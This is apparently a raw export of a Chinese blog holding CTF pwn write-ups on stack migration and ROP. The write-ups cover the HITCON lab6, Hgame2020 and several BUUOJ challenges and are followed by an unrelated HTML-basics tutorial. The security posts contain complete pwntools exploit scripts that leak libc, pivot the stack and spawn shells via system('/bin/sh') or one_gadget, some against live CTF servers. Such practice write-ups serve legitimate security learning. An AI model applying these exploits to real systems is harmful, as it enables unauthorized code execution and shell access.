(36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&apos;?\\n&apos;)#raw_input(&apos;-&gt;&apos;)io.sendline(payload)io.interactive() Stack Migration在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。 原理我们知道在函数建立栈帧时有两条指令push ebp; mov ebp, esp，而退出时同样需要消除这两条指令的影响，即leave(mov esp, ebp; pop ebp) 。且leave一般紧跟着就是ret。因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。 -w533 第一次随着程序流leave; ret，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。 1ovtYT.jpg 第二次进入我们放入栈上的leave; ret 的gadget（这个是我们事先写上栈的）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。 1oxKN6.png 1ovjXj.png HITCON_training_lab6_64位这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。 源码1234567891011121314#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\\xc3&quot; ;int main()&#123;if( count!=1337 )&#123; _exit(1);&#125;count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;&#125; gcc -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令 简单分析这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试： -w332 -w955 熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。 1og2r9.jpg 注意一下rsp被覆盖的值。 1ogs8U.jpg 计算padding为48. 1ogwEq.jpg 计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。 图解分析假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半： 1ogabn.jpg 开始执行一下leave 中的mov rsp,rbp： 1ogUDs.jpg 此时rsp 也指向了 rbp指向的位置，在执行leave中的pop rbp: 1ocMfU.jpg 此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget: 1ocZmn.jpg 1ocklQ.jpg 此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。 1o6oo6.jpg 1o6gWF.jpg 在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget： 1o60Ln.jpg 1o6NRg.jpg 执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行： 1o6tJS.jpg 1o6Yi8.jpg 这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链: 1o6lqI.jpg 1o6QsA.jpg 1o6VIK.jpg 读入完成，接着再次执行leave的gadget： 1o6AVx.jpg 1oyk4S.jpg 可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链： 1os600.jpg 就可以拿到shell了。 EXP借着这个思路就可以开始写exp: 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *import timecontext.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;e = ELF(&apos;./test&apos;)l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) # io = remote(&apos;127.0.0.1&apos;,4000)io = process(&apos;./test&apos;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&apos;puts&apos;]puts_got = e.got[&apos;puts&apos;]read_add = e.symbols[&apos;read&apos;]io.recvuntil(&apos;:&apos;)p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&apos;-&gt;&apos;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&apos;-&gt;&apos;)io.sendline(p)io.recvuntil(&apos;\\n&apos;)puts = u64((io.recv(6)).ljust(8,&apos;\\x00&apos;))libc = puts - l.symbols[&apos;puts&apos;]print(&apos;libc_base:&apos; + hex(libc))binsh_add = l.search(&apos;/bin/sh\\x00&apos;).next() + libc#print(binsh_add)# raw_input(&apos;-&gt;&apos;)system_add = l.symbols[&apos;system&apos;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive() Hgame2020_week2_rop_level2查保护和arch 1os8OI.jpg 32位程序，开了nx保护 ida分析 1osEO1.md.jpg 这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。 1orMMn.jpg 那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。 攻击思路程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是./flag，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。 EXP12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;# io = process(&apos;./ROP&apos;)io = remote(&apos;47.103.214.163&apos;,20300)e = ELF(&apos;./ROP&apos;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&apos;think so?\\n&apos;)p = flat([&apos;./flag\\x00\\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&apos;\\n&apos;)p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret)raw_input(&apos;-&gt;&apos;) #手动下一个断点，以后让gdb附加上进行调试io.send(p)flag = io.recvline_contains(&apos;hgame&apos;)print(flag)io.interactive() 我们跟着exp来调试一下，看看效果： 1or3ZV.jpg 此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到./flag的字眼。执行一下leave： 1orGIU.jpg 可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret： 1orQrq.jpg 先记录下当前的状态，开始执行leave： 1or8aT.jpg 执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入./flag，这个固定地址也做为给open函数做参数。 1ormGQ.jpg 在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag： 1oDzPe.jpg Stack Migration小总结 这下可以总结下利用思路也就是 把控好起初栈的ebp，在里面写入需要伪造的new esp 在之后的可利用字节中写入leave gadget 将想执行的ROP Chain写在已知固定位置上 再利用leave搬移Stack位置到已知位置 然后无限接ROP Chain","categories":[],"tags":[]},{"title":"ROP题目练习","slug":"ROP练习","date":"2020-02-03T08:21:13.000Z","updated":"2020-02-18T03:53:18.000Z","comments":true,"path":"2020/02/03/ROP练习/","link":"","permalink":"http://chumen77.xyz/2020/02/03/ROP练习/","excerpt":"","text":"ROP题目练习前言最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。 有libc（或者无libc可做）OGeek2019_babyrop查保护和arch32位程序，开启NX堆栈不可执行。 ida分析可以看出其取了一个随机数，存入buf。然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。 观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。 分析总结其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用\\x00来截断。v5这个返回参数可以控制为’\\xff’,然后进入带有溢出的函数，写rop链就行了。先用puts函数泄露出__libc_start_main的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。 exp1234567891011121314151617181920212223242526272829303132from pwn import *import time# io = process('./pwn')io = remote('node3.buuoj.cn',27780)libc = ELF('./libc-2.23.so')# blibc = ELF('/lib/i386-linux-gnu/libc-2.23.so')elf = ELF('./pwn')# raw_input('-&gt;')p1 = '\\x00'.ljust(8,'\\xff') offset = 0xe7 + 4io.send(p1 + '\\n')io.recvline_contains('Correct')start_add=0x080485A0put_add = elf.symbols['puts']libc_start_add = elf.got['__libc_start_main']rop1 = [ put_add, start_add, libc_start_add]p2 = offset * '\\x00' + ''.join(map(p32,rop1))io.sendline(p2)sleep(1)libc_base = u32(io.recv(4)) - libc.symbols['__libc_start_main']REC = libc_base+0x3a80cprint('libc_base :'+hex(libc_base))offset = 0xe7 + 4io.send(p1 + '\\n')io.recvline_contains('Correct')p3 = offset * '\\x00' + p32(REC)io.sendline(p3)io.interactive() HarekazeCTF2019_baby_rop查保护和arch ida分析123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] system(&quot;echo -n \\&quot;What&apos;s your name? \\&quot;&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); printf(&quot;Welcome to the Pwn World, %s!\\n&quot;, &amp;v4); return 0;&#125; 程序十分简单，给了system函数，且明显存在溢出。ida查看字符串，该可以发现/bin/sh/，这构造个简单rop链直接利用就好了。 exp1234567891011121314from pwn import *import time# io = process(&apos;./babyrop&apos;)io = remote(&apos;node3.buuoj.cn&apos;,28633)elf = ELF(&apos;./babyrop&apos;)offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols[&apos;system&apos;]# io.recvline_contains(&apos;your&apos;)# raw_input(&apos;-&gt;&apos;)p = &apos;a&apos; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive() 拿到shell后，这个题buuctf根目录下没有flag文件。需要find / -name &quot;flag&quot; 可以查到是在/home/babyrop/flag这个目录下。 HarekazeCTF2019_baby_rop2查保护和arch ida分析函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出__libc_start_main函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。 exp123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *import timeio = process(&apos;./babyrop2&apos;)# blibc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)# context.log_level = &apos;debug&apos;libc = ELF(&apos;./libc.so.6&apos;)io = remote(&apos;node3.buuoj.cn&apos;,27694)elf = ELF(&apos;./babyrop2&apos;)offset = 40__libc_start_add = elf.got[&apos;__libc_start_main&apos;]start_add = 0x0400540 printf_add = elf.symbols[&apos;printf&apos;]aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&apos;__libc_start_main&apos;]rop1 = [ pop_rdi_ret, aWelcomeToThePw, pop_rsi_r15_ret, __libc_start_add, 0, printf_add, start_add]io.recvuntil(&apos;e? &apos;)# io.recvuntil(&apos;again, &apos;)# raw_input(&apos;-&gt;&apos;)p = &apos;a&apos; * offset + &apos;&apos;.join(map(p64,rop1))io.sendline(p)io.recvline_contains(&apos;again&apos;)s = io.recvline_contains(&apos;again&apos;)libc_base = int(u64(s[32:38].ljust(8,&apos;\\x00&apos;))) - libc_start_sysRCE = libc_base + 0x4526aprint(&apos;libc_base:&apos;+hex(libc_base))io.recvuntil(&apos;name? &apos;)# io.recvuntil(&apos;name? &apos;)p = &apos;\\x00&apos; * offset + p64(RCE) + &apos;\\x00&apos; * 70sleep(1)raw_input(&apos;-&gt;&apos;)io.sendline(p)io.interactive() 无libc这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~已经测试出办法咯。https://github.com/lieanu/LibcSearcher bjdctf_2020_babyrop查保护和arch ida分析函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出__libc_start_main函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于system(&#39;/bin/sh&#39;)的rop链即可。 exp1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *import time# context.log_level = &apos;debug&apos;io = remote(&apos;node3.buuoj.cn&apos;,28661)# io = process(&apos;./bjdctf_2020_babyrop&apos;)elf = ELF(&apos;./bjdctf_2020_babyrop&apos;)# blibc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)io.recvuntil(&apos;story!\\n&apos;)padding = 40libc_main_add = elf.got[&apos;__libc_start_main&apos;]puts_add = elf.symbols[&apos;puts&apos;]pop_rdi_ret = 0x0400733 p = &apos;a&apos;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,&apos;\\x00&apos;))print(hex(s))obj = LibcSearcher(&quot;__libc_start_main&quot;,s)libc_base = s - obj.dump(&quot;__libc_start_main&quot;)system_add = libc_base + obj.dump(&quot;system&quot;)binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)sleep(1)io.recvuntil(&apos;story!\\n&apos;)p = &apos;a&apos;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive() unctf_easyrop查保护和arch ida分析主程序主要就是限制了v2需要等于ffff才能进入带有溢出的函数，v2的值是这个在read的时候把控好，让ffff填入这个位置即可。然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是ebp-0x10，然后分析下这里的汇编，它把read函数的溢出位置返回值ebp-0x14取出来，与0x8050000进行比较。也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。 思路总结先控制好v2让其等于ffff，然后进入带有溢出的函数，然后构造rop链，先把__libc_start_main的内存地址泄露出来，然后用libcseacher来确定libc版本，然后dump出__libc_start_main的sympols,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from LibcSearcher import *import time# context.log_level = &apos;debug&apos;io = process(&apos;./easyrop&apos;)# io = remote(&apos;183.129.189.60&apos;,10011)io.recvuntil(&apos;TFer!\\n&apos;)e =ELF(&apos;./easyrop&apos;)raw_input(&apos;-&gt;&apos;)padding = 36start_add = 0x08048400libc_start_main = e.got[&apos;__libc_start_main&apos;]puts_add = e.symbols[&apos;puts&apos;]ret = 0x0804839ep = &apos;f&apos; * paddingrop1 = [ puts_add, start_add, libc_start_main]io.sendline(p)io.recvuntil(&apos;name?\\n&apos;)p = &apos;\\x00&apos; * 0x18 + &apos;&apos;.join(map(p32,rop1))raw_input(&apos;&gt;&apos;)io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)print(libc_base)system_add = obj.dump(&apos;system&apos;) + libc_basebinsh_add = obj.dump(&apos;str_bin_sh&apos;) + libc_baseio.recvuntil(&apos;TFer!\\n&apos;)p = &apos;f&apos; * paddingio.sendline(p)io.recvuntil(&apos;name?\\n&apos;)rop2 = [ ret, system_add, start_add, binsh_add]p = &apos;\\x00&apos; * 0x14 + &apos;&apos;.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive() 铁人三项(第五赛区)_2018_rop查保护和arch32位 ida分析123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; be_nice_to_people(); vulnerable_function(); return write(1, &quot;Hello, World\\n&quot;, 0xDu);&#125; 主函数很简单，漏洞函数是在第二个函数。栈溢出，然后直接构造rop链即可。利用思路：用wirte函数泄露出__libc_start_main在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。 这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。这个是让你选择的。 在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。 exp123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *context.log_level = &apos;debug&apos;context.arch = &apos;i386&apos;elf = ELF(&apos;./2018_rop&apos;)# io = process(&apos;./2018_rop&apos;)io = remote(&apos;node3.buuoj.cn&apos;,29692)padding = 140 write_plt = elf.symbols[&apos;write&apos;]libc_start_main_got = elf.got[&apos;__libc_start_main&apos;]start = 0x080483C0 p = padding * &apos;\\x00&apos; + flat([write_plt,start,1,libc_start_main_got,0x10])# raw_input(&apos;-&gt;&apos;)io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&apos;__libc_start_main&apos;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&apos;__libc_start_main&apos;)system_add = libc_base + obj.dump(&apos;system&apos;)binsh_add = libc_base + obj.dump(&apos;str_bin_sh&apos;)# print(libc.symbols[&apos;__libc_start_main&apos;])print(hex(libc_base))# io.recvline()RCE = libc_base + 0x3cbecp = padding * &apos;\\x00&apos; + p32(RCE) + padding * &apos;\\x00&apos;# p = padding * &apos;\\x00&apos; + p32(system_add) + p32(start) + p32(binsh_add)io.sendline(p)io.interactive() 这里面两种办法都行。 xdctf2015_pwn200查保护和arch12345Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析主函数十分简单，漏洞在vuln函数：padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。 exp12345678910111213141516171819202122232425from pwn import *from LibcSearcher import *# io = process('./bof')io = remote('node3.buuoj.cn',27178)elf = ELF('./bof')libc = elf.libccontext.arch = 'i386'context.log_level = 'debug'padding = 112start_add = 0x080483E0libc_start_main_got = elf.got['__libc_start_main']write_plt = elf.symbols['write']io.recvuntil('2015~!\\n')p = padding * '\\x00' + flat([write_plt,start_add,1,libc_start_main_got,0x10])io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher('__libc_start_main',libc_start_main_add)libc_base = libc_start_main_add - obj.dump('__libc_start_main')print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil('2015~!\\n')rce = libc_base + 0x3a80cp = padding * '\\x00' + p32(rce) + padding * '\\x00'io.sendline(p)io.interactive() 还是本地来base库查libc的one_gadget，然后ret to rce。","categories":[],"tags":[]},{"title":"","slug":"HTML 基础","date":"2019-12-29T13:42:51.000Z","updated":"2020-02-18T00:59:17.000Z","comments":true,"path":"2019/12/29/HTML 基础/","link":"","permalink":"http://chumen77.xyz/2019/12/29/HTML 基础/","excerpt":"","text":"HTML 基础 HTML标题：是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的.；其会因为数字变化而显示的字体大小变化； HTML段落：通过标签&lt;p&gt; 来定义的. HTML链接：通过标签&lt;a&gt;来定义的。 HTML图像：通过标签 &lt;img&gt; 来定义的。 HTML 文本HTML 标题标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签进行定义的.&lt;h1&gt; 定义最大的标题。 &lt;h6&gt;定义最小的标题。浏览器会自动地在标题的前后添加空行。 标题很重要： 不要仅仅是为了生成粗体或大号的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。 HTML 注释注释： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。 1&lt;!-- 这是一个注释 --&gt; HTML 段落浏览器会自动地在段落的前后添加空行。（&lt;/p&gt;是块级元素） HTML 水平线1：&lt;hr&gt;标签在 HTML 页面中创建水平线。 HTML 文本格式化通常用到&lt;strong&gt;&lt;em&gt;&lt;del&gt;这几个标签。 练习：1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;h4&gt;标题4&lt;/h4&gt; &lt;h5&gt;标题5&lt;/h5&gt; &lt;h6&gt;标题6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;标签有大小之分 --&gt; &lt;h2&gt;五花山&lt;/h2&gt; &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt; &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt; &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt; &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt; &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt; &lt;!-- 几个标签的嵌套 --&gt; &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 图像 ==HTML 图像-== ： 标签（ &lt;img&gt;）是空标签，意思是说，它只包含属性，并且没有闭合标签。 源属性（&lt;src&gt;）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意绝对路径和相对路径（可以用../来返回 一级目录，返回几级目录就写几个它就行)。 Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。==搜索引擎也是通过此描述来收集图片的==. 高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。 练习： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"chumen的qq图像\" title=\"chumen的qq图像\"&gt;&lt;/body&gt;&lt;/html&gt; 图片的映射目标是为了在一张图片上的某个位置点击后才可以实现某个功能。 这需要用到usemap=&quot;#diyname&quot; 然后用&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;标签来对应。 核心代码：` 1&lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt; \\\\` shape是选择的形状，coords是坐标，坐标确定推荐用qq的截图功能那里来确定，比如： 那这个彩色箭头指的位置就是在这个图像的（233,456）位置。 练习： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"\" usemap=\"#1map\"&gt; &lt;map name=\"1map\"&gt; &lt;area shape=\"circle\" coords=\"300,255,50\" target=\"_blank\" href=\"http://www.baidu.com\"&gt; &lt;/map&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 超链接超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 &lt;a&gt;来设置超文本链接。 HTML 链接语法:&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; ,href 属性描述了链接的目标。 target 属性 :target=&quot;_blank&quot;效果就是在新窗口（空白界面）做出来 。 id 属性:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID: &lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”: &lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 解释加补充：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（&lt;a href=&quot;# &quot;&gt;），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。 &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; 做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个 练习：（为了方便阅读，省略了很多的&lt;br&gt;.） 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=\"http://www.mi.com\" target=\"_blank\"&gt;&lt;img src=\"1.png\"&gt;&lt;/a&gt; &lt;!-- /*书签标记：锚点*/ --&gt; &lt;a href=\"#end\"&gt;end&lt;/a&gt;&lt;br id=\"aa\"&gt;&lt;br&gt;&lt;br id=\"miao\"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=\"miao\"&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=\"end\"&gt;&lt;/a&gt; &lt;a href=\"#miao\"&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; HTML 列表 HTML无序列表：&lt;ul&gt;与 &lt;li&gt;其点的样式(圆圈，圆心，正方形）用css来控制&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML 有序列表 &lt;ol&gt;与&lt;li&gt; 用法和无序相似，且有序与无序之间可以互相嵌套，嵌套过程中点的形状也会自动变化。 HTML 自定义列表：这个是比较常用的，自定义列表以&lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt;开始。其不仅仅是一列项目，而是项目及其注释的组合。 123456&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt; 练习： 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;ul style=\"list-style-type:circle\"&gt; &lt;li&gt;无序列表1&lt;/li&gt; &lt;li&gt;无序列表2&lt;/li&gt; &lt;li&gt;无序列表3&lt;/li&gt; &lt;li&gt;无序列表4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;有序列表1&lt;/li&gt; &lt;li&gt;有序列表2&lt;/li&gt; &lt;li&gt;有序列表3&lt;/li&gt; &lt;li&gt;有序列表4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;标题1&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;dt&gt;标题2&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML表格 HTML 表格：表格由 &lt;table&gt;标签来定义。每个表格均有若干==行==（由 &lt;tr&gt; 标签定义），每行被分割为若干==单元格==（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table 